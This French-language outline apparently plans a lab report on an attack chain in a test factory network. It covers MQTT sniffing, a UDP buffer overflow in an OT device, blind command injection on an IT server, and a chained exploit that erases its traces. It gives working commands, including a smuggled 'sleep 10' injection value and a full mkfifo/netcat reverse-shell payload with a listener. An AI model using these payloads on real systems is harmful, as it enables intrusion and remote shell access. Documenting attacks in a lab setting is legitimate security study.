# La Chaîne d'Attaque et Mouvement Latéral (POV Attaquant)

## Phase de Reconnaissance et d'Écoute

* **Points à rédiger :**
    * L'attaquant est connecté au réseau Wi-Fi local de l'usine (`10.42.0.0/24`).
    * **Scan réseau :** Il utilise des outils pour cartographier les cibles. Il identifie le serveur IT (IP `10.42.0.33` avec le port TCP 1883 ouvert) et l'équipement OT (IP `10.42.0.182` avec le port UDP 3333 ouvert).
    * **Interception (Sniffing) :** En s'abonnant au broker MQTT (qui ne requiert pas de mot de passe), l'attaquant observe le trafic légitime et comprend le format des données : `{"device_id": "watch01", "vibration": ...}`.
* **Éléments à inclure :**
    * **Commande Nmap :** `nmap -sV -p 1883,3333 10.42.0.0/24` (pour illustrer la découverte).
    * **Sortie Console (Interception) :** La capture du JSON normal via `mosquitto_sub`.

## Découverte de la Faille Physique (Buffer Overflow OT)

* **Points à rédiger :**
    * L'attaquant effectue du *Fuzzing* (envoi de données aléatoires) sur le port UDP 3333 de la montre pour voir comment elle réagit.
    * Il découvre qu'en envoyant une chaîne de caractères de plus de 32 octets (ex: 32 "A" suivis de "HACKED"), le champ `device_id` dans les messages MQTT suivants change et devient "HACKED".
    * Il en déduit la présence d'un dépassement de tampon (*Buffer Overflow*) permettant d'écrire de manière arbitraire dans la mémoire de la montre.
* **Éléments à inclure :**
    * **Commande de Fuzzing :** `echo -n "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAHACKED" | nc -u 10.42.0.182 3333`
    * **Preuve (Sortie MQTT) :** Montrer le JSON intercepté où l'ID est devenu "HACKED".

## Identification de la Vulnérabilité Serveur (Injection IT)

* **Points à rédiger :**
    * L'attaquant tente de comprendre comment le serveur réagit aux mauvais identifiants. Il injecte des caractères spéciaux utilisés dans les terminaux Linux (comme le point-virgule `;` ou les guillemets `'`).
    * Il s'aperçoit que s'il injecte une commande comme `watch01'; sleep 10 #`, le serveur cesse de publier ou de répondre pendant exactement 10 secondes.
    * **Déduction :** Le serveur utilise une fonction d'exécution système (type `os.system`) vulnérable aux injections de commandes (*Command Injection*) pour traiter les erreurs d'identifiants. L'attaquant a trouvé son point d'entrée.
* **Éléments à inclure :** Aucun code spécifique ici, juste l'explication de la méthode de déduction (les *Blind OS Injections*).

## Exploitation Finale : Le Chained Exploit (Mouvement Latéral)

* **Points à rédiger :**
    * C'est le point d'orgue de l'attaque. L'attaquant combine les deux failles pour compromettre le serveur IT à travers le composant OT.
    * Explication de la charge utile (*Payload*) : Création d'un tunnel (`mkfifo` / `nc`) encapsulé dans un sous-shell (`&`) pour ne pas faire crasher le serveur (éviter le déni de service).
    * Explication de la furtivité : Une fois le payload envoyé, la montre restaure son ID d'origine (*Auto-Healing*) pour effacer les traces de l'attaque côté capteur.
* **Éléments à inclure :**
    * **La préparation :** La commande d'écoute sur le PC de l'attaquant : `nc -lvnp 4444`.
    * **Le Payload Final (La "Magic Bullet") :** ```bash
        echo -n "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwatch01'; rm -f /tmp/f; mkfifo /tmp/f; (cat /tmp/f | /bin/sh -i 2>&1 | nc 10.42.0.1 4444 >/tmp/f) & #" | nc -u -w 1 10.42.0.182 3333
        ```
    * **Le Résultat (Capture d'écran CRUCIALE) :** Une capture de ton terminal où l'on voit le prompt du reverse shell s'ouvrir avec un accès `root` ou `rpi` sur la machine distante (`10.42.0.33`).
